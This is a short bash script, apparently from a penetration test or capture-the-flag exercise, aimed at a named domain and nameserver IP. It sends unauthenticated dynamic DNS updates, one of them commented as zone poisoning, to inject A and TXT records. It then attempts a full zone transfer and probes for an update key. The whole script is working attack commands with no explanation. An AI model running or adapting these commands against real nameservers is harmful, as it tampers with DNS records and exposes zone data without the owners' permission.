#!/bin/bash

TARGET="openbar.today"
NS="129.88.46.51"

# 1. Test dynamic DNS update
nsupdate <<EOF
server $NS
zone $TARGET
update add group1.$TARGET 300 A 127.0.0.1
send
EOF

# 2. Try zone poisoning
nsupdate <<EOF
server $NS
zone $TARGET
update add test.$TARGET 300 TXT "test_entry"
send
EOF

# 3. Verify updates
for group in {1..6}; do
    dig @$NS group$group.$TARGET
done

# 4. Check if updates succeeded
dig @$NS axfr $TARGET

# 5. Test DDNS key auth
dig @$NS key.$TARGET ANY